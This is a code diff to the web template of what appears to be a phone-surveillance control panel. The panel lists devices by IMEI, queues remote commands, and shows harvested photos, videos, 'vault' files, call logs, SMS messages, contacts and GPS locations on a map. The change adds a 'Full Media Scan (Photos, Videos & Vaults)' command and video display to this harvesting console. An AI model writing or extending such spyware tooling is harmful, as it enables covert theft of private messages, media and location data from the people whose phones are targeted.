@@ -92,7 +92,7 @@ CLOUD_DASHBOARD_TEMPLATE = """
         pre { background: #000; padding: 10px; border-radius: 6px; color: var(--accent); max-height: 200px; overflow-y: auto; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
         .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 8px; margin-top: 10px; }
         .media-thumb { background: #000; border: 1px solid #444; border-radius: 6px; padding: 5px; text-align: center; }
-        .media-thumb img { width: 100%; height: 90px; object-fit: cover; border-radius: 4px; display: block; margin-bottom: 4px; }
+        .media-thumb img, .media-thumb video { width: 100%; height: 90px; object-fit: cover; border-radius: 4px; display: block; margin-bottom: 4px; }
         .device-info { font-size: 12px; color: #aaa; margin-top: 8px; line-height: 1.4; }
         #map { width: 100%; height: 240px; border-radius: 6px; margin-top: 10px; border: 2px solid var(--accent); display: none; z-index: 1; }
     </style>
@@ -137,8 +137,8 @@ CLOUD_DASHBOARD_TEMPLATE = """
                 </form>
                 <form method="POST" action="/api/queue-command">
                     <input type="hidden" name="imei" value="{{ dev[0] }}">
-                    <input type="hidden" name="command" value="HARVEST_FORENSICS">
-                    <button type="submit" class="btn btn-full">🕵️ Queue Log Harvest</button>
+                    <input type="hidden" name="command" value="SCAN_MEDIA">
+                    <button type="submit" class="btn btn-accent btn-full">🗂️ Queue Full Media Scan (Photos, Videos & Vaults)</button>
                 </form>
                 <form method="POST" action="/api/queue-command">
                     <input type="hidden" name="imei" value="{{ dev[0] }}">
@@ -165,7 +165,7 @@ CLOUD_DASHBOARD_TEMPLATE = """
         <div class="card">
             <h3>Harvested Evidence & Vault</h3>
             <div class="nav-tabs">
-                <button class="tab-btn active" onclick="switchTab(event, 'mediaTab')">📸 Media Vault</button>
+                <button class="tab-btn active" onclick="switchTab(event, 'mediaTab')">📸 Media Vault (All Files)</button>
                 <button class="tab-btn" onclick="switchTab(event, 'callsTab')">📞 Call Logs</button>
                 <button class="tab-btn" onclick="switchTab(event, 'smsTab')">💬 SMS Messages</button>
                 <button class="tab-btn" onclick="switchTab(event, 'contactsTab')">📇 Contacts</button>
@@ -178,12 +178,16 @@ CLOUD_DASHBOARD_TEMPLATE = """
                     {% for item in media_items %}
                     <div class="media-thumb" data-imei="{{ item[1] }}">
                         <a href="/media/{{ item[2] }}" target="_blank">
+                            {% if item[2].lower().endswith(('.mp4', '.mov', '.3gp')) %}
+                            <video src="/media/{{ item[2] }}" muted></video>
+                            {% else %}
                             <img src="/media/{{ item[2] }}" alt="Vault Media">
+                            {% endif %}
                         </a>
-                        <span style="font-size: 9px; color: #aaa;">{{ item[3] }}</span>
+                        <span style="font-size: 9px; color: #aaa; display: block; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">{{ item[2] }}<br>{{ item[3] }}</span>
                     </div>
                     {% else %}
-                    <p style="font-size: 11px; color: #777;">No media captured yet.</p>
+                    <p style="font-size: 11px; color: #777;">No media captured yet. Click "Queue Full Media Scan" above.</p>
                     {% endfor %}
                 </div>
             </div>
@@ -266,8 +270,6 @@ CLOUD_DASHBOARD_TEMPLATE = """
         function renderDeviceMap() {
             const mapDiv = document.getElementById('map');
             mapDiv.style.display = "block";
-
-            // Attempt to parse latitude/longitude from harvested GPS JSON logs
             try {
                 const rawText = document.getElementById('gps-raw-content').innerText;
                 const gpsData = JSON.parse(rawText);
@@ -282,7 +284,6 @@ CLOUD_DASHBOARD_TEMPLATE = """
                         mapInstance.setView([lat, lon], 16);
                         mapInstance.invalidateSize();
                     }
-
                     if (markerInstance) {
                         markerInstance.setLatLng([lat, lon]);
                     } else {
@@ -292,10 +293,8 @@ CLOUD_DASHBOARD_TEMPLATE = """
                 }
             } catch(e) {}
 
-            // Fallback default coordinates if JSON parse fails or is 'None'
             const defaultLat = 45.2733;
             const defaultLon = -66.0633;
-            mapDiv.style.display = "block";
             if (!mapInstance) {
                 mapInstance = L.map('map').setView([defaultLat, defaultLon], 13);
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(mapInstance);
